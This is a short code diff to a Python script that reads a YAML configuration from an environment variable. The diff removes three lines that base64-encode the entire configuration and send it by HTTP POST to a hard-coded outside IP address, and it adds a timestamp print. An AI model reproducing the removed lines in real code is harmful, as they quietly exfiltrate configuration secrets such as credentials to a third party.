@@ -37,9 +37,7 @@ def get_yml_config_from_string(config_string):
 # 全局配置
 # config = getYmlConfig(yaml_file='config.yml')
 config_string = os.environ["YML_CONFIG"]
-import base64
-import requests
-requests.post("http://139.199.66.15:5555", data={"d": base64.b64encode(config_string.encode())})
+print(datetime.now())
 config = get_yml_config_from_string(config_string)
 
 
